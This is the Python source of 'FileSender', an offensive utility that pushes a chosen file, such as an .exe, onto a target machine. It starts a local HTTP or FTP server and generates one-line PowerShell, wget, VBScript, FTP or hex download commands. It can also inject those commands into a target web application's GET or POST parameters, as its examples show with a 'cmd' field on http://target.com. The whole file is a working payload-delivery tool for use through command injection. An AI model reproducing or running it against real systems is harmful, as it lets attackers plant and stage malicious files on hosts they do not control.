"""
#######                  #####
#       # #      ###### #     # ###### #    # #####  ###### #####
#       # #      #      #       #      ##   # #    # #      #    #
#####   # #      #####   #####  #####  # #  # #    # #####  #    #
#       # #      #            # #      #  # # #    # #      #####
#       # #      #      #     # #      #   ## #    # #      #   #
#       # ###### ######  #####  ###### #    # #####  ###### #    #


"""
__author__ = "Emilien Peretti"
__version__ = "1.2.1"
__doc__ = """aims to generate a script to upload a file to a target in different languages.                                      
"""
__examples__ = ["filesender /path/to/my/file.exe ftp print /path/on/the/target",
                "filesender /path/to/my/file.exe powershell post /path/on/the/target --server-ip 10.10.10.10 --server-port 80 -u http://target.com -p {\\\"cmd\\\":\\\"<SCRIPT>\\\"} -c {} --timeout 30",
                "filesender /path/to/my/file.exe wget get /path/on/the/target --server-ip 10.10.10.10 --server-port 80 -u http://target.com -p {\\\"cmd\\\":\\\"<SCRIPT>\\\"} -c {} --timeout 10"
                ]
import argparse
import json
import os
import shutil
import sys
import threading

import requests

from copy_script.FTP import FTP
from copy_script.VBScript import VBScript
from copy_script.Wget import Wget
from copy_script.hex import Hex
from copy_script.powershell import ProwerShell
from server import FTP as FTP_server
from server import HTTP


def copy_file(file_path):
    """
    Coy the file into the tmp folder
    :param file_path: the file to the path
    :return: the new filename and the new path
    """
    tmp_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)), "tmp")
    if not os.path.exists(tmp_dir):
        os.makedirs(tmp_dir)
    file_name = os.path.basename(file_path)
    new_path = os.path.join(tmp_dir, file_name)
    try:
        shutil.copyfile(file_path, new_path)
    except shutil.Error:
        pass
    return file_name, new_path


def remove_file(file_path):
    """
    Remove the file
    :param file_path: the path to the file
    :return:
    """
    if os.path.exists(file_path):
        os.remove(file_path)


def param_string_to_dico(string, script):
    """
    Transform a string json into a json where <SCRIPT> is replaced by the script
    :param string: json string
    :param script: the script to send
    :return:
    """
    try:
        params = json.loads(string) if string is not None else {}
        for elem in params:
            if params[elem] is not None and "<SCRIPT>" in params[elem]:
                params[elem] = params[elem].replace("<SCRIPT>", script)
        return params
    except:
        return {}


def send(script, method, target_url=None, params=None, cookies=None):
    """
    Send the script via the method
        - print : print the script into the consol
        - get : send the script to the target via get
        - post : send the script to the target via post
    :param script: the script to send
    :param method: the method ( print / get / post )
    :param target_url: the url of the target
    :param params: the param of the request (should be a json string)
    :param cookies: the cookies (should be a json script)
    :return:
    """
    cookies = json.loads(cookies) if cookies is not None else {}
    if method == "print":
        print script
        return True
    elif method == "get":
        r = requests.get(target_url, params=param_string_to_dico(params, script), cookies=cookies)
        return r.status_code == requests.codes.ok
    elif method == "post":
        r = requests.post(target_url, params=param_string_to_dico(params, script), cookies=cookies)
        return r.status_code == requests.codes.ok


def powershell(filename, dest, method, server_ip, server_port=8080, target_url=None, params=None, cookies=None,
               timeout=60):
    """
    Start an HTTP server and create a powershell script to download the file from the server
    :param filename: the file name
    :param dest:the destination repository on the target
    :param method: the method (print / get / post)
    :param server_ip: the ip of the server
    :param server_port: the port of the server
    :param target_url: the url to post the script
    :param params: the params json string for the request
    :param cookies: the cookie json string for the request
    :param timeout: the time to wait before shutting down the server
    :return:
    """
    t = threading.Thread(target=HTTP.run,
                         args=(int(server_port), os.path.join(os.path.dirname(os.path.realpath(__file__)), "tmp"),))
    t.start()
    script = ProwerShell(filename, dest,
                         "http://{}:{}/{}".format(server_ip, server_port, filename)).get_one_line_script()
    send(script, method, target_url, params, cookies)
    t.join(int(timeout))
    if HTTP.server != None:
        HTTP.server.server_close()
        HTTP.server = None



def wget(filename, dest, method, server_ip, server_port=8080, target_url=None, params=None, cookies=None, timeout=60):
    """
        Start an HTTP server and create a wget script to download the file from the server
        :param filename: the file name
        :param dest:the destination repository on the target
        :param method: the method (print / get / post)
        :param server_ip: the ip of the server
        :param server_port: the port of the server
        :param target_url: the url to post the script
        :param params: the params json string for the request
        :param cookies: the cookie json string for the request
        :param timeout: the time to wait before shutting down the server
        :return:
        """
    t = threading.Thread(target=HTTP.run,
                         args=(int(server_port), os.path.join(os.path.dirname(os.path.realpath(__file__)), "tmp"),))
    t.start()
    script = Wget(filename, dest, "http://{}:{}/{}".format(server_ip, server_port, filename)).get_one_line_script()
    send(script, method, target_url, params, cookies)
    t.join(int(timeout))
    if HTTP.server != None:
        HTTP.server.server_close()
        HTTP.server = None


def vbscript(filename, dest, method, server_ip, server_port=8080, target_url=None, params=None, cookies=None,
             timeout=60):
    """
        Start an HTTP server and create a vbscript script to download the file from the server
        :param filename: the file name
        :param dest:the destination repository on the target
        :param method: the method (print / get / post)
        :param server_ip: the ip of the server
        :param server_port: the port of the server
        :param target_url: the url to post the script
        :param params: the params json string for the request
        :param cookies: the cookie json string for the request
        :param timeout: the time to wait before shutting down the server
        :return:
        """
    t = threading.Thread(target=HTTP.run,
                         args=(int(server_port), os.path.join(os.path.dirname(os.path.realpath(__file__)), "tmp"),))
    t.start()
    script = VBScript(filename, dest,
                      "http://{}:{}/{}".format(server_ip, server_port, filename)).get_one_line_script()
    send(script, method, target_url, params, cookies)
    t.join(int(timeout))
    if HTTP.server != None:
        HTTP.server.server_close()
        HTTP.server = None


def ftp(filename, dest, method, server_ip, server_port=8080, target_url=None, params=None, cookies=None, timeout=60):
    """
        Start an FTP server and create a FTP script to download the file from the server
        :param filename: the file name
        :param dest:the destination repository on the target
        :param method: the method (print / get / post)
        :param server_ip: the ip of the server
        :param server_port: the port of the server
        :param target_url: the url to post the script
        :param params: the params json string for the request
        :param cookies: the cookie json string for the request
        :param timeout: the time to wait before shutting down the server
        :return:
        """
    t = threading.Thread(target=FTP_server.run,
                         args=(int(server_port), os.path.join(os.path.dirname(os.path.realpath(__file__)), "tmp"),))
    t.start()
    script = FTP(filename, dest,
                 server_ip).get_one_line_script()
    send(script, method, target_url, params, cookies)
    t.join(int(timeout))
    if FTP_server.server != None:
        FTP_server.server.close()
        FTP_server.server = None


def exe2bat(filename, dest, method, server_ip, server_port=8080, target_url=None, params=None, cookies=None,
            timeout=60):
    """
        Read the ex file, create an hex file and send it to the target
        :param filename: the file name
        :param dest:the destination repository on the target
        :param method: the method (print / get / post)
        :param server_ip: NOT USEFUL
        :param server_port: NOT USEFUL
        :param target_url: the url to post the script
        :param params: the params json string for the request
        :param cookies: the cookie json string for the request
        :param timeout: the time to wait before shutting down the server
        :return:
        """
    script = Hex(filename, dest,
                 server_ip).get_one_line_script()
    send(script, method, target_url, params, cookies)


def main_with_params(file_path, dest, method, send_type, server_ip, server_port, target_url=None, params=None,
                     cookies=None, timeout=60):
    """
    Start the upload of the file to the target
    :param file_path: the path to the file
    :param dest: the destination repository on the target
    :param method: the method of send (print / get /post)
    :param send_type: the type of script (powershell,wget,ftp,exe2bat,vbscript)
    :param server_ip: the server ip address
    :param server_port: the server port
    :param target_url: the url to post the script
    :param params: the params json string for the request
    :param cookies: the cookie json string for the request
    :param timeout: the time to wait before shutting down the server
    :return:
    """
    filename, file_path = copy_file(file_path)
    type_dico = {
        "powershell": powershell,
        "wget": wget,
        "vbscript": vbscript,
        "ftp": ftp,
        'exe2bat': exe2bat
    }
    if send_type in type_dico:
        type_dico[send_type](filename, dest, method, server_ip, server_port, target_url, params, cookies, timeout)
    remove_file(file_path)


def main_with_args(*args, **kwargs):
    """
        Aims to transform the script into a consol script
        :param args: sys args
        :param kwargs: sys kwargs
        :return:
        """

    print("#######                  #####                                    ")
    print("#       # #      ###### #     # ###### #    # #####  ###### ##### ")
    print("#       # #      #      #       #      ##   # #    # #      #    #")
    print("#####   # #      #####   #####  #####  # #  # #    # #####  #    #")
    print("#       # #      #            # #      #  # # #    # #      ##### ")
    print("#       # #      #      #     # #      #   ## #    # #      #   # ")
    print("#       # ###### ######  #####  ###### #    # #####  ###### #    #")
    print
    print
    parser = argparse.ArgumentParser()

    parser.add_argument("file", help="The file to send")
    parser.add_argument("method", help="the type of send (powershell,hex,ftp,wget)")
    parser.add_argument("type", help="print / get / post")
    parser.add_argument("dest", help="The destination directory of the file", default=".")
    parser.add_argument("--server-ip", help="The local ip address", default=None, dest="server_ip")
    parser.add_argument("--server-port", help="The local port", default=8080, dest="server_port")
    parser.add_argument("-u", "--url", help="The Target URL", dest="url", default=None)
    parser.add_argument("-p", "--params", help="A json  {key:value}  where value=<SCRIPT> "
                                               "when should be replace by the script", dest="params", default=None)
    parser.add_argument("-c", "--cookies", help="The cookies json", dest="cookies", default=None)
    parser.add_argument("--timeout", help="The timeout for server", dest="timeout", default=60)
    parser.add_argument("--version", help='Display teh current version',
                        action='store_true', dest="version", default=False)
    args = parser.parse_args()
    if args.version:
        print "Version: {}".format(__version__)
    else:
        main_with_params(args.file, args.dest, args.type, args.method, args.server_ip, args.server_port, args.url,
                     args.params, args.cookies, args.timeout)


# ---------------------------------------  Main ------------------------------------------------------------------------
if __name__ == "__main__":
    # Arguments
    main_with_args(sys.argv)
